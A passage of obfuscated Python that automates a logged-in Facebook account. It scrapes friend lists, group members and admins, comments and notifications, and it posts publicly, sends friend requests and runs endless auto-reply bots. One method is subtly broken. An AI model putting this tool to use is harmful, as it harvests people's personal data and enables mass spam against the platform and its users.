   for O0OO0OO0OO0OO0000 in O0O0OOOO0O0O0OO0O :#line:558
     try :OOOO00O0O000O0000 [O0OO0OO0OO0OO0000 ['name']]=O0OO0OO0OO0OO0000 ['value']#line:559
     except :pass #line:560
   OOOO00O0O000O0000 ["xc_message"]=OO0O000000OO00O0O #line:561
   OOOO00O0O000O0000 ["view_post"]='Post'#line:562
   OOOO00O0O000O0000 ["view_privacy"]="Public"#line:563
   OO0OOOOO00O0OOO00 =O0O00O0O0OO0O0O00 .s .post (O0O00O0O0OO0O0O00 .url .format (O0O00OOO00O0O0O0O ['action']),OOOO00O0O000O0000 )#line:564
   return OO0OOOOO00O0OOO00 .status_code #line:565
  def pagepost (OOOO0O0O0000000O0 ,OOO00OOO0O0OO0000 ,O0OOOOOOOOO00OO00 ):#line:567
   OOO0OO00O00O00OOO ={}#line:568
   OO0000O0O0O0OOO0O =OOOO0O0O0000000O0 .s .get (OOOO0O0O0000000O0 .url .format ('/'+str (O0OOOOOOOOO00OO00 )))#line:569
   O00O000OO000OO000 =bs (OO0000O0O0O0OOO0O .content ,'html.parser')#line:570
   O0O000OOOO0OO000O =O00O000OO000OO000 .find_all ('form');OO00O00O000OOOO00 =O0O000OOOO0OO000O [1 ]#line:571
   OO0000OOOO00OO0O0 =OO00O00O000OOOO00 .find_all ('input',{'type':'hidden'})#line:572
   for O0O0000O0O00OOO00 in OO0000OOOO00OO0O0 :#line:573
     try :OOO0OO00O00O00OOO [O0O0000O0O00OOO00 ['name']]=O0O0000O0O00OOO00 ['value']#line:574
     except :pass #line:575
   OOO0OO00O00O00OOO ["xc_message"]=OOO00OOO0O0OO0000 #line:576
   OOO0OO00O00O00OOO ["view_post"]='Post'#line:577
   OOO0OO00O00O00OOO ["view_privacy"]="Public"#line:578
   OO0OOOO0O00OO0O0O =OOOO0O0O0000000O0 .s .post (OOOO0O0O0000000O0 .url .format (OO00O00O000OOOO00 ['action']),OOO0OO00O00O00OOO )#line:579
   return OO0OOOO0O00OO0O0O .status_code #line:580
  def grouppost (O000OO0O0OOOOO000 ,O00O0000OOO0O000O ,OO000OO00OOO0OOO0 ):#line:582
   O0O00000OOO00OOOO ={}#line:583
   OO0OO0OOO00O0OOOO =O000OO0O0OOOOO000 .s .get (O000OO0O0OOOOO000 .url .format ('/groups/'+str (OO000OO00OOO0OOO0 )))#line:584
   OOO00O0OOO00OO00O =bs (OO0OO0OOO00O0OOOO .content ,'html.parser')#line:585
   O0000O0O0OOOOO000 =OOO00O0OOO00OO00O .find_all ('form');OOOO000OOO0000O00 =O0000O0O0OOOOO000 [1 ]#line:586
   O0OO0O00OO0OOOO00 =OOOO000OOO0000O00 .find_all ('input',{'type':'hidden'})#line:587
   for OOOOOO0O0000O00O0 in O0OO0O00OO0OOOO00 :#line:588
     try :O0O00000OOO00OOOO [OOOOOO0O0000O00O0 ['name']]=OOOOOO0O0000O00O0 ['value']#line:589
     except :pass #line:590
   O0O00000OOO00OOOO ["xc_message"]=O00O0000OOO0O000O #line:591
   O0O00000OOO00OOOO ["view_post"]='Post'#line:592
   O0O00000OOO00OOOO ["view_privacy"]="Public"#line:593
   OO0000OO0000O0O0O =O000OO0O0OOOOO000 .s .post (O000OO0O0OOOOO000 .url .format (OOOO000OOO0000O00 ['action']),O0O00000OOO00OOOO )#line:594
   return OO0000OO0000O0O0O .status_code #line:595
  def getonline (O0OO00OO0OOOOOO0O ):#line:597
    OOOO0OOO00OO00OOO =[]#line:598
    O000O0O00O0OOOOO0 =bs (O0OO00OO0OOOOOO0O .s .get (O0OO00OO0OOOOOO0O .url .format ("/buddylist.php")).content ,"html.parser")#line:599
    for O0O00O0O00OOO00OO in O000O0O00O0OOOOO0 .find_all ("a"):#line:600
       try :#line:601
         if "/messages/read/?fbid"in O0O00O0O00OOO00OO ['href']:#line:602
           OOOO0OOO00OO00OOO .append (str (O0O00O0O00OOO00OO ['href']).split ("=")[1 ].split ("&")[0 ])#line:603
       except :pass #line:604
    return OOOO0OOO00OO00OOO #line:605
  def getcomments (OOO00O0O0O0O00O00 ,OOO00O0O0O0OOO00O ):#line:607
    OO0OOO00O0O000O00 ={};OOO00O0OOO0O0OOO0 =0 #line:608
    OO00O0O0OO0O0OO00 =OOO00O0O0O0O00O00 .s .get (OOO00O0O0O0OOO00O )#line:609
    OO0O000O00O0OO00O =bs (OO00O0O0OO0O0OO00 .content ,'html.parser')#line:610
    O0OOOO00O000O0OO0 =OO0O000O00O0OO00O .find_all ('div')#line:611
    OOO00000O00OOOO0O =OO0O000O00O0OO00O .find_all ('div',{'class':csearch (O0OOOO00O000O0OO0 )})#line:612
    for OOO0OO00OO00000O0 in OOO00000O00OOOO0O :#line:613
     try :#line:614
      O0O00000000OO0O00 =OOO0OO00OO00000O0 .div .div ['class']#line:615
      OO0OOO00O0O000O00 [OOO00O0OOO0O0OOO0 ]={'id':OOO0OO00OO00000O0 ['id'],'name':OOO0OO00OO00000O0 .a .get_text (),'profile':OOO0OO00OO00000O0 .a .get ('href'),'text':OOO0OO00OO00000O0 .find ('div',{'class':O0O00000000OO0O00 }).get_text (),'clink':asearch (OOO0OO00OO00000O0 .find_all ('a'),'/comment/replies/')};OOO00O0OOO0O0OOO0 +=1 #line:622
     except :pass #line:623
    return OO0OOO00O0O000O00 #line:624
  def getcommentsreply (OO0OO0OO0000O00O0 ,OO0OOO0O00OO000OO ):#line:626
    OO0O000O0O0O0OOOO ={};OOO0000000O0O00OO =0 #line:627
    OO00O0O000OOO00O0 =OO0OO0OO0000O00O0 .s .get (OO0OOO0O00OO000OO )#line:628
    OOOO00O000O0OOO0O =bs (OO00O0O000OOO00O0 .content ,'html.parser')#line:629
    OO0000O000O000OOO =OOOO00O000O0OOO0O .find_all ('div')#line:630
    O0O0O0OOO00OOO000 =OOOO00O000O0OOO0O .find_all ('div',{'class':csearch (OO0000O000O000OOO )})#line:631
    for O0000O0OO0000O000 in O0O0O0OOO00OOO000 :#line:632
      try :#line:633
        O00OO00OOOOO0OO00 =O0000O0OO0000O000 .div .div ['class']#line:634
        OO0O000O0O0O0OOOO [OOO0000000O0O00OO ]={'id':O0000O0OO0000O000 ['id'],'name':O0000O0OO0000O000 .a .get_text (),'profile':O0000O0OO0000O000 .a .get ('href'),'text':O0000O0OO0000O000 .find ('div',{'class':O00OO00OOOOO0OO00 }).get_text ()};OOO0000000O0O00OO +=1 #line:640
      except :pass #line:641
    return OO0O000O0O0O0OOOO #line:642
  def getfriends (OOO00OOOOOOO0O00O ,OOOOOO0OO00O00OOO ):#line:644
    O0000OOOO0OOO0000 ={};O0000OOOO00O0000O =0 #line:645
    OO0O0O00OO000O0O0 =OOO00OOOOOOO0O00O .url .format ('/profile.php?v=friends&id='+str (OOOOOO0OO00O00OOO ))#line:646
    while True :#line:647
      try :#line:648
        OO00O00O00O0O0OOO =OOO00OOOOOOO0O00O .s .get (OO0O0O00OO000O0O0 )#line:649
        OO00OOOO000O00O0O =bs (OO00O00O00O0O0OOO .content ,'html.parser')#line:650
        for O0OOO0O0OOOO000OO in OO00OOOO000O00O0O .find_all ('table',{'role':'presentation'}):#line:651
         if 'profile picture'in O0OOO0O0OOOO000OO .img ['alt']:#line:652
          O0000OOOO0OOO0000 [O0000OOOO00O0000O ]={'name':O0OOO0O0OOOO000OO .a .get_text (),'id':toid (O0OOO0O0OOOO000OO .a ['href'])};O0000OOOO00O0000O +=1 #line:656
      except :pass #line:657
      try :#line:659
        OO00OOOO0OOO000O0 =tsearch (OO00OOOO000O00O0O .find_all ('a'),'See more friends')[0 ]#line:660
        OO0O0O00OO000O0O0 =OOO00OOOOOOO0O00O .url .format (OO00OOOO0OOO000O0 ['href'])#line:661
      except :break #line:662
    return O0000OOOO0OOO0000 #line:664
  def getgroupadmins (OO0OOO0O0000O000O ,OOO0OOO0000OO0000 ):#line:666
    O000O0O0OO00O00OO =0 ;O00OOO00OO0OOO00O ={}#line:667
    OO000O00000OOOOOO =OO0OOO0O0000O000O .url .format ("/browse/group/members/?id="+str (OOO0OOO0000OO0000 )+"&listType=list_admin_moderator")#line:668
    while True :#line:669
      O00OO000O0OOOOO00 =OO0OOO0O0000O000O .s .get (OO000O00000OOOOOO )#line:670
      O0O00O0OOO0OO0OO0 =bs (O00OO000O0OOOOO00 .content ,"html.parser")#line:671
      O0O0000O0OO0OO00O =O0O00O0OOO0OO0OO0 .find_all ('table')#line:672
      OOO0O00OOOOO0O0OO =' '.join (O0O0000O0OO0OO00O [5 ]['class'])#line:673
      OO0000000O00OOO0O =O0O00O0OOO0OO0OO0 .find_all ('table',attrs ={'class':OOO0O00OOOOO0O0OO })#line:674
      for O00O000OOOO0O0OOO in OO0000000O00OOO0O :#line:676
        try :#line:677
          O00OOO00OO0OOO00O [O000O0O0OO00O00OO ]={'name':O00O000OOOO0O0OOO .a .get_text (),'id':O00O000OOOO0O0OOO ['id'].split ('_')[1 ]};O000O0O0OO00O00OO +=1 #line:681
        except :#line:682
          pass #line:683
      try :#line:685
        OO000O0OOO000O0O0 =O0O00O0OOO0OO0OO0 .find ("div",attrs ={"id":"m_more_item"})#line:686
        OO000O00000OOOOOO =OO0OOO0O0000O000O .url .format (OO000O0OOO000O0O0 .a ['href'])#line:687
      except :#line:688
        break #line:689
    return O00OOO00OO0OOO00O #line:690
  def getgroup (O0O0O0OO0O0O0O00O ,O0OOO0OOO0OOO0OOO ):#line:692
    OO0000O0O0O000O0O =0 ;OOOOOOOO0O000000O ={}#line:693
    O0O0OO00O00O0OO00 =O0O0O0OO0O0O0O00O .url .format ("/browse/group/members/?id="+str (O0OOO0OOO0OOO0OOO ))#line:694
    while True :#line:695
      O0O0O0OOOOO00O00O =O0O0O0OO0O0O0O00O .s .get (O0O0OO00O00O0OO00 )#line:696
      OO0O00OOO0O0O000O =bs (O0O0O0OOOOO00O00O .content ,"html.parser")#line:697
      O0O00O0OOOO000OO0 =OO0O00OOO0O0O000O .find_all ('table')#line:698
      OO0O000000OOO000O =' '.join (O0O00O0OOOO000OO0 [5 ]['class'])#line:699
      OO000OO0OO0000OOO =OO0O00OOO0O0O000O .find_all ('table',attrs ={'class':OO0O000000OOO000O })#line:700
      for O0OO0O000O0OO0OOO in OO000OO0OO0000OOO :#line:702
        try :#line:703
          OOOOOOOO0O000000O [OO0000O0O0O000O0O ]={'name':O0OO0O000O0OO0OOO .a .get_text (),'id':O0OO0O000O0OO0OOO ['id'].split ('_')[1 ]};OO0000O0O0O000O0O +=1 #line:707
        except :#line:708
          pass #line:709
      try :#line:711
        OO0OOO0000000000O =OO0O00OOO0O0O000O .find ("div",attrs ={"id":"m_more_item"})#line:712
        O0O0OO00O00O0OO00 =O0O0O0OO0O0O0O00O .url .format (OO0OOO0000000000O .a ['href'])#line:713
      except :#line:714
        break #line:715
    return OOOOOOOO0O000000O #line:716
  def getgroupposts (O0O00OOOO00OO00OO ,O0000OO0OOO00O0O0 ):#line:719
    OO0OOO0000O0OOO00 =[]#line:720
    O00O0OO0O000O000O =O0O00OOOO00OO00OO .url .format ("/groups/"+str (O0000OO0OOO00O0O0 ))#line:721
    while True :#line:722
      O0OOOO00000O0O0O0 =O0O00OOOO00OO00OO .s .get (O00O0OO0O000O000O )#line:723
      OOOOOO0OOO000O000 =bs (O0OOOO00000O0O0O0 .content ,"html.parser")#line:724
      OO00OO00OO00O0O00 =OOOOOO0OOO000O000 .find_all ('a')#line:725
      for OO0O000000OOO0000 in tsearch (OO00OO00OO00O0O00 ,'Full Story'):#line:726
        try :#line:727
          OO0OOO0000O0OOO00 .append (OO0O000000OOO0000 ['href'])#line:728
        except :pass #line:729
      try :#line:730
        OO0OOO0O0O0O0OOOO =tsearch (OO00OO00OO00O0O00 ,'See more posts')[0 ]#line:731
        O00O0OO0O000O000O =O0O00OOOO00OO00OO .url .format (OO0OOO0O0O0O0OOOO ['href'])#line:732
      except :break #line:733
    return OO0OOO0000O0OOO00 #line:735
  def getname (O00000000O0O0OO00 ):#line:737
   try :#line:738
     OO0000000O0OO0OOO =O00000000O0O0OO00 .s .get (O00000000O0O0OO00 .url .format ('/profile.php'))#line:739
     OO00OO00O00O0O0OO =bs (OO0000000O0OO0OOO .content ,'html.parser')#line:740
     return OO00OO00O00O0O0OO .title .get_text ()#line:741
   except :pass #line:742
  def notification (O0OOOOO00OO000O0O ):#line:744
    OOO0OOOO0OOOOO0O0 ={};OOO0OOOO000O0O0OO =0 #line:745
    OO0OOOO0OOOO0OOO0 =O0OOOOO00OO000O0O .s .get (O0OOOOO00OO000O0O .url .format ('/notifications.php'))#line:746
    O0OO0OOO00000OOOO =bs (OO0OOOO0OOOO0OOO0 .content ,'html.parser')#line:747
    OOOO0O00O0O0OO0OO =O0OO0OOO00000OOOO .find ('div',{'id':"notifications_list"})#line:748
    OOO000O000OOO00O0 =OOOO0O00O0O0OO0OO .find_all ('table',{'class':OOOO0O00O0O0OO0OO .table ['class'][0 ]})#line:749
    for OOO00O00O0OOO00O0 in OOO000O000OOO00O0 :#line:750
     try :#line:751
      OOO0OOOO0OOOOO0O0 [OOO0OOOO000O0O0OO ]={'name':OOO00O00O0OOO00O0 .span .span .get_text (),'text':OOO00O00O0OOO00O0 .span .get_text (),'link':OOO00O00O0OOO00O0 .a .get ('href')};OOO0OOOO000O0O0OO +=1 #line:756
     except :pass #line:757
    return OOO0OOOO0OOOOO0O0 #line:758
  def postdata (OO00O0OOO00O00OOO ,OO00OOOOO0OOOO0O0 ):#line:760
     OOO0OOOOOO0O0O000 =OO00O0OOO00O00OOO .s .get (OO00OOOOO0OOOO0O0 )#line:762
     O00000OOO0O0OO0O0 =bs (OOO0OOOOOO0O0O000 .content ,'html.parser')#line:763
     OO0OO00O00O0O0000 =O00000OOO0O0OO0O0 .find_all ('strong')#line:764
     OO0O00O0O0O0OO00O =[]#line:765
     for O00OOO0OOOOOO000O in OO0OO00O00O0O0000 :#line:766
       try :#line:767
         if O00OOO0OOOOOO000O ['class']:#line:768
           pass #line:769
       except :#line:770
         OO0O00O0O0O0OO00O .append (O00OOO0OOOOOO000O )#line:771
     return {'name':OO0O00O0O0O0OO00O [0 ].get_text (),'link':OO0O00O0O0O0OO00O [0 ].a ['href'],'text':O00000OOO0O0OO0O0 .find ('div',attrs ={'class':'cg'}).get_text ()}#line:777
  def follow (OO0O0OO0O0O00O000 ,O00OO0O0O0OOOOOO0 ):#line:780
     try :#line:781
      try :#line:782
       O0OO0OO00O0O000O0 =bs (OO0O0OO0O0O00O000 .s .get (OO0O0OO0O0O00O000 .url .format ("/profile.php?id="+str (O00OO0O0O0OOOOOO0 ))).text ,"html.parser")#line:783
      except :#line:784
        pass #line:785
      for O0OO00000000OOO00 in O0OO0OO00O0O000O0 .find_all ("a"):#line:787
        try :#line:788
          if "profile_add_friend.php"in O0OO00000000OOO00 ['href']:#line:789
            s .get (url .format (O0OO00000000OOO00 ['href']))#line:790
          elif "subscribe.php"in O0OO00000000OOO00 ['href']:#line:792
            OO0O0OO0O0O00O000 .s .get (OO0O0OO0O0O00O000 .url .format (O0OO00000000OOO00 ['href']))#line:793
        except :pass #line:794
     except :pass #line:795
  def pagelike (O0000O0OOO00O0000 ,O0000O00O0O0O0O0O ):#line:797
      OOO0O00O00O0O000O =O0000O0OOO00O0000 .s .get (O0000O0OOO00O0000 .url .format ('/'+O0000O00O0O0O0O0O ))#line:798
      O00OO0O00OOOO0O0O =bs (OOO0O00O00O0O000O .content ,'html.parser')#line:799
      OO0O0OO00O0O0OO0O =O00OO0O00OOOO0O0O .find_all ('a')#line:800
      OO00O00O0O00OO0OO =O0000O0OOO00O0000 .s .get (O0000O0OOO00O0000 .url .format (asearch (OO0O0OO00O0O0OO0O ,'/a/profile.php?fan')))#line:801
      return OO00O00O0O00OO0OO #line:802
  def getfriendlist (O0O00OOO00O0000OO ,O00OO0OO00O0O00O0 ):#line:804
      O0000OOO00OOOOO00 ={};OO00O0OOO0O00OO0O =0 #line:805
      O00O0000OOO0OOOO0 =O0O00OOO00O0000OO .url .format ("/friends")#line:806
      while OO00O0OOO0O00OO0O <=O00OO0OO00O0O00O0 :#line:807
        OOO0OOO0OOOO00OOO =O0O00OOO00O0000OO .s .get (O00O0000OOO0OOOO0 )#line:808
        O0OO00OOO000OO0O0 =bs (OOO0OOO0OOOO00OOO .content ,"html.parser")#line:809
        OO00O000O000OO000 =O0OO00OOO000OO0O0 .find_all ('a')#line:810
        for OOO00O0OO0OOO0O0O in tsearch (OO00O000O000OO000 ,'Add Friend'):#line:811
          try :#line:812
            O0000OOO00OOOOO00 [OO00O0OOO0O00OO0O ]={'name':OOO00O0OO0OOO0O0O ['aria-label'].split ('Add ')[1 ].split (' as a friend')[0 ],'id':OOO00O0OO0OOO0O0O ['href'].split ('add_friend.php?id=')[1 ].split ('&hf=')[0 ],'link':OOO00O0OO0OOO0O0O ['href']};OO00O0OOO0O00OO0O +=1 #line:817
          except :pass #line:818
        try :#line:819
          O00000OOOOOOO0000 =tsearch (OO00O000O000OO000 ,'See More')[0 ]#line:820
          O00O0000OOO0OOOO0 =O0O00OOO00O0000OO .url .format (O00000OOOOOOO0000 ['href'])#line:821
        except :break #line:822
      return O0000OOO00OOOOO00 #line:824
  def timelineupload (OOOOOOOO0000OOO0O ,O0000OOOO000O0O0O ,O0O00O00OO00O0OOO ):#line:826
      O00OOO00O0OOOO000 =OOOOOOOO0000OOO0O .s .get (OOOOOOOO0000OOO0O .url .format ('/profile.php'))#line:827
      O0O0O000000O00O0O =bs (O00OOO00O0OOOO000 .content ,'html.parser')#line:828
      O0000OOOOO0O0000O =getform (O0O0O000000O00O0O .find_all ('form')[1 ])#line:829
      O0000OOOOO0O0000O ["view_photo"]='Photo'#line:830
      O0O0O0O000O00OOOO =OOOOOOOO0000OOO0O .url .format (O0000OOOOO0O0000O .pop ('action'))#line:831
      O0OO00OOOOOOOOO00 =bs (OOOOOOOO0000OOO0O .s .post (O0O0O0O000O00OOOO ,O0000OOOOO0O0000O ).content ,'html.parser')#line:832
      O0OO0OOOO0O00000O =getform (O0OO00OOOOOOOOO00 .find ('form'))#line:833
      O0OO0OOOO0O00000O ["add_photo_done"]="Preview"#line:834
      OOO00O0O0OOOO000O =OOOOOOOO0000OOO0O .url .format (O0OO0OOOO0O00000O .pop ('action'))#line:835
      O0O00O00OO00O0OOO ={'file1':(O0O00O00OO00O0OOO ,open (O0O00O00OO00O0OOO ,'rb'),'multipart/form-data',{'Expires':'0'})}#line:839
      O0OOO000OOOO00O00 =bs (OOOOOOOO0000OOO0O .s .post (OOO00O0O0OOOO000O ,data =O0OO0OOOO0O00000O ,files =O0O00O00OO00O0OOO ).content ,'html.parser')#line:840
      OO000O0O00OO0OO00 =getform (O0OOO000OOOO00O00 .find ('form'))#line:841
      OO000O0O00OO0OO00 ["view_privacy"]='Public'#line:842
      OO000O0O00OO0OO00 ["xc_message"]=str (O0000OOOO000O0O0O )#line:843
      OO000O0O00OO0OO00 ["view_post"]='Post'#line:844
      return OOOOOOOO0000OOO0O .s .post (OOOOOOOO0000OOO0O .url .format (OO000O0O00OO0OO00 .pop ('action')),OO000O0O00OO0OO00 )#line:845
  def groupupload (O0000OOO00O0O0O00 ,O0O00O00000O00O0O ,O000O0O00O0O0O000 ,OOOOOOOOOO0OOOO00 ):#line:847
      O0OOOO000O00OOO0O =O0000OOO00O0O0O00 .s .get (O0000OOO00O0O0O00 .url .format ('/groups/'+str (O0O00O00000O00O0O )))#line:848
      OO000O000000OOOOO =bs (O0OOOO000O00OOO0O .content ,'html.parser')#line:849
      OOOOOOOOOOO000OO0 =getform (OO000O000000OOOOO .find_all ('form')[1 ])#line:850
      OOOOOOOOOOO000OO0 ["view_photo"]='Photo'#line:851
      O000O00OO000O0OOO =O0000OOO00O0O0O00 .url .format (OOOOOOOOOOO000OO0 .pop ('action'))#line:852
      OOOO0O0OOO0O0OOO0 =bs (O0000OOO00O0O0O00 .s .post (O000O00OO000O0OOO ,OOOOOOOOOOO000OO0 ).content ,'html.parser')#line:853
      O0000000OOO000OO0 =getform (OOOO0O0OOO0O0OOO0 .find ('form'))#line:854
      O0000000OOO000OO0 ["add_photo_done"]="Preview"#line:855
      O0OO0O000OO000000 =O0000OOO00O0O0O00 .url .format (O0000000OOO000OO0 .pop ('action'))#line:856
      OOOOOOOOOO0OOOO00 ={'file1':(OOOOOOOOOO0OOOO00 ,open (OOOOOOOOOO0OOOO00 ,'rb'),'multipart/form-data',{'Expires':'0'})}#line:860
      OOOOO00O00O000OOO =bs (O0000OOO00O0O0O00 .s .post (O0OO0O000OO000000 ,data =O0000000OOO000OO0 ,files =OOOOOOOOOO0OOOO00 ).content ,'html.parser')#line:861
      OOOOOOOOO0O0OO000 =getform (OOOOO00O00O000OOO .find ('form'))#line:862
      OOOOOOOOO0O0OO000 ["view_privacy"]='Public'#line:863
      OOOOOOOOO0O0OO000 ["xc_message"]=str (O000O0O00O0O0O000 )#line:864
      OOOOOOOOO0O0OO000 ["view_post"]='Post'#line:865
      return O0000OOO00O0O0O00 .s .post (O0000OOO00O0O0O00 .url .format (OOOOOOOOO0O0OO000 .pop ('action')),OOOOOOOOO0O0OO000 )#line:866
  def pageupload (OO0OOO00OO00OO000 ,OO000000O0OOO00O0 ,OO00OO0OO00O0O000 ,OOOO0O0O00OO000O0 ):#line:868
       OOO0O000OO000O000 =OO0OOO00OO00OO000 .s .get (OO0OOO00OO00OO000 .url .format ('/'+str (OO000000O0OOO00O0 )))#line:869
       O000O0O00O0OO000O =bs (OOO0O000OO000O000 .content ,'html.parser')#line:870
       O00OO0O0000000O00 =getform (O000O0O00O0OO000O .find_all ('form')[1 ])#line:871
       O00OO0O0000000O00 ["view_photo"]='Photo'#line:872
       OO0OO0000OOOOO00O =OO0OOO00OO00OO000 .url .format (O00OO0O0000000O00 .pop ('action'))#line:873
       O00OOOO0O00OO0OO0 =bs (OO0OOO00OO00OO000 .s .post (OO0OO0000OOOOO00O ,O00OO0O0000000O00 ).content ,'html.parser')#line:874
       O0OO00OOO000000O0 =getform (O00OOOO0O00OO0OO0 .find ('form'))#line:875
       O0OO00OOO000000O0 ["add_photo_done"]="Preview"#line:876
       OOO00OOO00O0O0OOO =OO0OOO00OO00OO000 .url .format (O0OO00OOO000000O0 .pop ('action'))#line:877
       OOOO0O0O00OO000O0 ={'file1':(OOOO0O0O00OO000O0 ,open (OOOO0O0O00OO000O0 ,'rb'),'multipart/form-data',{'Expires':'0'})}#line:881
       O00OO000O000O0OOO =bs (OO0OOO00OO00OO000 .s .post (OOO00OOO00O0O0OOO ,data =O0OO00OOO000000O0 ,files =OOOO0O0O00OO000O0 ).content ,'html.parser')#line:882
       OO0O0000OO0O00O00 =getform (O00OO000O000O0OOO .find ('form'))#line:883
       OO0O0000OO0O00O00 ["view_privacy"]='Public'#line:884
       OO0O0000OO0O00O00 ["xc_message"]=str (OO00OO0OO00O0O000 )#line:885
       OO0O0000OO0O00O00 ["view_post"]='Post'#line:886
       return OO0OOO00OO00OO000 .s .post (OO0OOO00OO00OO000 .url .format (OO0O0000OO0O00O00 .pop ('action')),OO0O0000OO0O00O00 )#line:887
'''

    CLASS BOT
    Pass FB() object to BOT
    a = FB()
    a.setemail('xyz')
    a.setpasswd('xyz')
    a.login()
    b = BOT(a)
    

'''#line:901
class BOT :#line:904
  def __init__ (OOO0OO000000O00OO ,OOO0OOOO000O0O00O ):#line:905
    OOO0OO000000O00OO .B_ =OOO0OOOO000O0O00O #line:906
    OOO0OO000000O00OO .myname =OOO0OOOO000O0O00O .getname ()#line:907
    OOO0OO000000O00OO .myid =OOO0OOOO000O0O00O .getaccountid ()#line:908
  def CommentMathBOT (OOO00O0O00000OOOO ,O00O000O0OOOOOO00 ):#line:910
   O0OO0O0O0OOOO000O =[]#line:911
   while True :#line:912
    try :#line:913
      OO000OO0O0O0O00O0 =OOO00O0O00000OOOO .B_ .getcomments (O00O000O0OOOOOO00 )#line:914
      for OOOO0O00O000O0O00 in range (len (OO000OO0O0O0O00O0 .keys ())):#line:915
       OOO000O0O00OO00O0 =OO000OO0O0O0O00O0 [OOOO0O00O000O0O00 ]#line:916
       if OOO000O0O00OO00O0 ['name']!=OOO00O0O00000OOOO .myname and OOO000O0O00OO00O0 ['text']not in O0OO0O0O0OOOO000O and OOO000O0O00OO00O0 ['name']:#line:917
        OOO000OO0O0000O00 =int (OOO000O0O00OO00O0 ['id'])#line:918
        OOO0OOOOOOOO0000O ='''Question : {}\nAnswer : {}
        '''.format (OOO000O0O00OO00O0 ['text'],MSolv (OOO000O0O00OO00O0 ['text']))#line:920
        print ("[*] Comment from {} Replied.. ".format (OOO000O0O00OO00O0 ['name']))#line:921
        OOO0000O0O00O0000 =OOO00O0O00000OOOO .B_ .url .format (OOO000O0O00OO00O0 ['clink'])#line:922
        OOO00O0O00000OOOO .B_ .comment (OOO0OOOOOOOO0000O ,OOO0000O0O00O0000 )#line:923
        O0OO0O0O0OOOO000O .append (OOO000O0O00OO00O0 ['text'])#line:924
    except :pass #line:926
  def RuleCommentBOT (OO0OO0O00O0OO0O00 ,OO000000O0O0O0OO0 ,O0OOO0OOOO00000O0 ):#line:929
     O00OOO00O00O0OOO0 =[]#line:930
     while True :#line:931
      try :#line:932
        O000OOO00O0O0000O =OO0OO0O00O0OO0O00 .B_ .getcomments (OO000000O0O0O0OO0 )#line:933
        for OOOOO0OO0O0OO00O0 in range (len (O000OOO00O0O0000O .keys ())):#line:934
         O00OOOOO0OO000000 =O000OOO00O0O0000O [OOOOO0OO0O0OO00O0 ]#line:935
         if O00OOOOO0OO000000 ['name']!=OO0OO0O00O0OO0O00 .myname and O00OOOOO0OO000000 ['text']not in O00OOO00O00O0OOO0 and O00OOOOO0OO000000 ['name']:#line:936
          OOOO0OO00O00O00O0 =int (O00OOOOO0OO000000 ['id'])#line:937
          OO0O00000OOO0O00O ='''{}'''.format (O0OOO0OOOO00000O0 .get (O00OOOOO0OO000000 ['text']))#line:938
          print ("[*] Comment from {} Replied.. ".format (O00OOOOO0OO000000 ['name']))#line:939
          OOOOO0OO000O0OOO0 =OO0OO0O00O0OO0O00 .B_ .url .format (O00OOOOO0OO000000 ['clink'])#line:940
          OO0OO0O00O0OO0O00 .B_ .comment (OO0O00000OOO0O00O ,OOOOO0OO000O0OOO0 )#line:941
          O00OOO00O00O0OOO0 .append (O00OOOOO0OO000000 ['text'])#line:942
      except :pass #line:944
  def InboxMathBOT (OO0O000OO0O0OOO0O ):#line:947
    while True :#line:948
     try :#line:949
      O0OOOOO00O0OOOOO0 =OO0O000OO0O0OOO0O .B_ .newmsgs ()#line:950
      for O00O0OOO0O00O0O00 in range (len (O0OOOOO00O0OOOOO0 .keys ())):#line:952
       try :#line:953
        OO0O0O00O0OO000OO =O0OOOOO00O0OOOOO0 [O00O0OOO0O00O0O00 ].get ('msg')#line:954
        O00OOOO0O0OO000OO =O0OOOOO00O0OOOOO0 [O00O0OOO0O00O0O00 ].get ('ID')#line:955
        if OO0O0O00O0OO000OO [0 ]!='|':#line:956
         if O00OOOO0O0OO000OO ==OO0O000OO0O0OOO0O .myid :#line:957
           O00OOOO0O0OO000OO =O0OOOOO00O0OOOOO0 [O00O0OOO0O00O0O00 ].get ('ID2')#line:958
         OO00O0O000OOOO00O =MSolv (OO0O0O00O0OO000OO )#line:959
         O0OO00O000OOOOO00 ='| Answer : {}'.format (OO00O0O000OOOO00O )#line:960
         OO0O000OO0O0OOO0O .B_ .fbsend (O0OO00O000OOOOO00 ,O00OOOO0O0OO000OO )#line:961
         print ('[*] {} | {} --> {} '.format (O00OOOO0O0OO000OO ,O0OOOOO00O0OOOOO0 [O00O0OOO0O00O0O00 ]['name'],OO00O0O000OOOO00O ))#line:962
       except :pass #line:963
     except :pass #line:964
  def RuleInboxBOT (O0000OOO000000O0O ,O00O0O00OO00OOOOO ):#line:966
      while True :#line:967
       try :#line:968
        O00O00O00O0000O0O =O0000OOO000000O0O .B_ .newmsgs ()#line:969
        for OOO00O0O0O00O0000 in range (len (O00O00O00O0000O0O .keys ())):#line:971
         try :#line:972
          OOOO00OO00000O0OO =O00O00O00O0000O0O [OOO00O0O0O00O0000 ].get ('msg')#line:973
          O00O0OOO00O0000OO =O00O00O00O0000O0O [OOO00O0O0O00O0000 ].get ('ID')#line:974
          if OOOO00OO00000O0OO [0 ]!='|':#line:975
           if O00O0OOO00O0000OO ==O0000OOO000000O0O .myid :#line:976
             O00O0OOO00O0000OO =O00O00O00O0000O0O [OOO00O0O0O00O0000 ].get ('ID2')#line:977
           OO0O0OO0O00OOOO00 =O00O0O00OO00OOOOO .get (OOOO00OO00000O0OO .lower ())#line:978
           OO00000O0OO0OO0OO ='|{}'.format (OO0O0OO0O00OOOO00 )#line:979
           O0000OOO000000O0O .B_ .fbsend (OO00000O0OO0OO0OO ,O00O0OOO00O0000OO )#line:980
           print ('[*] {} | {} --> {} '.format (O00O0OOO00O0000OO ,O00O00O00O0000O0O [OOO00O0O0O00O0000 ]['name'],OO0O0OO0O00OOOO00 ))#line:981
         except :pass #line:982
       except :pass #line:983
class PROXY :#line:988
  def __init__ (O0OOOO0OO0O00O0O0 ):#line:989
